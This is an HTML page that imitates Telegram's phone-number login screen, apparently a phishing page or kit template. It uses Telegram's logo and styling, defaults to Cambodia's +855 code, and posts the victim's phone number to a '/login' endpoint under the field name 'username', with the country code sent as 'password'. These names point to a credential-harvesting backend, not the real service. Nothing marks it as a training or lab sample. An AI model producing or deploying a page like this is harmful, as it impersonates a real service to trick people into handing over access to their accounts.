<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            line-height: 1.4;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
        }
        .container {
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 15px auto;
            color: #37AEE2;
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #000000;
        }
        .subtitle {
            font-size: 14px;
            color: #707579;
            line-height: 1.4;
            margin-bottom: 25px;
        }
        .form-section {
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            color: #000000;
            font-size: 14px;
        }
        .country-selector {
            width: 100%;
            padding: 12px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=US-ASCII,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'><path fill='%23666' d='m0 1 2 2 2-2z'/></svg>");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 10px;
        }
        .phone-input-container {
            position: relative;
            width: 100%;
        }
        .phone-input {
            width: 100%;
            padding: 12px 12px 12px 70px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
        }
        .phone-input::placeholder {
            color: #999;
        }
        .country-code-display {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #000000;
            font-size: 14px;
            font-weight: 500;
            pointer-events: none;
        }
        .separator {
            position: absolute;
            left: 55px;
            top: 50%;
            transform: translateY(-50%);
            color: #E0E0E0;
            font-size: 14px;
            pointer-events: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #37AEE2;
            border-radius: 3px;
            margin-right: 10px;
            position: relative;
            cursor: pointer;
        }
        .checkbox.checked {
            background-color: #37AEE2;
        }
        .checkbox.checked::after {
            content: "âœ“";
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 12px;
            font-weight: bold;
        }
        .checkbox-label {
            font-size: 14px;
            color: #000000;
            cursor: pointer;
        }
        .login-btn {
            background-color: #37AEE2;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: 600;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .login-btn:active {
            background-color: #2a8dbd;
        }
        .qr-section {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E0E0E0;
        }
        .qr-title {
            font-size: 14px;
            color: #37AEE2;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .qr-subtitle {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            padding: 15px;
        }
        .footer-text {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer-link {
            color: #37AEE2;
            text-decoration: none;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #37AEE2;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            .header {
                margin: 30px 0 20px 0;
            }
            .logo {
                width: 56px;
                height: 56px;
            }
            .title {
                font-size: 16px;
            }
            .subtitle {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="currentColor">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M8.287 5.906q-1.168.486-4.666 2.01-.567.225-.595.442c-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294q.39.01.868-.32 3.269-2.206 3.374-2.23c.05-.012.12-.026.166.016s.042.12.037.141c-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8 8 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629q.14.092.27.187c.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.4 1.4 0 0 0-.013-.315.34.34 0 0 0-.114-.217.53.53 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09"/>
                </svg>
            </div>
            <div class="title">Telegram</div>
            <div class="subtitle">
                Please confirm your country code and enter your phone number.
            </div>
        </div>

        <form action="/login" method="POST">
            <div class="form-section">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select class="country-selector" name="country" id="country" required>
                        <option value="">Select your country</option>
                        <option value="Cambodia" selected>Cambodia</option>
                        <option value="United States">United States</option>
                        <option value="United Kingdom">United Kingdom</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="phone">Your phone number</label>
                    <div class="phone-input-container">
                        <span class="country-code-display" id="countryCodeDisplay">+855</span>
                        <span class="separator">|</span>
                        <input type="tel" class="phone-input" name="username" id="phone_number" 
                               placeholder="Phone number" required pattern="[0-9]{7,15}">
                        <input type="hidden" name="password" id="countryCode" value="+855">
                    </div>
                </div>

                <div class="checkbox-group">
                    <div class="checkbox checked" id="keepSignedInCheckbox"></div>
                    <label class="checkbox-label" for="keepSignedInCheckbox">Keep me signed in</label>
                    <input type="hidden" name="keep_signedin" id="keepSignedIn" value="on">
                </div>

                <button type="submit" class="login-btn">NEXT</button>
            </div>
        </form>

        <div class="qr-section">
            <div class="qr-title">LOG IN BY QR CODE</div>
            <div class="qr-subtitle">
                Open Telegram on your phone and go to<br>
                Settings > Devices > Scan QR Code
            </div>
        </div>

        <div class="footer">
            <div class="footer-text">
                By signing in, you agree to our <a href="#" class="footer-link">Terms of Service</a> 
                and <a href="#" class="footer-link">Privacy Policy</a>.
            </div>
        </div>
    </div>

    <script>
        document.getElementById('keepSignedInCheckbox').addEventListener('click', function() {
            this.classList.toggle('checked');
            document.getElementById('keepSignedIn').value = this.classList.contains('checked') ? 'on' : 'off';
        });

        document.getElementById('country').addEventListener('change', function() {
            const countryCodes = {
                'Cambodia': '+855',
                'United States': '+1',
                'United Kingdom': '+44'
            };
            const selectedCountry = this.value;
            const countryCode = countryCodes[selectedCountry] || '+855';
            document.getElementById('countryCodeDisplay').textContent = countryCode;
            document.getElementById('countryCode').value = countryCode;
        });

        document.getElementById('phone_number').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('country').value = 'Cambodia';
        });
    </script>
</body>
</html>
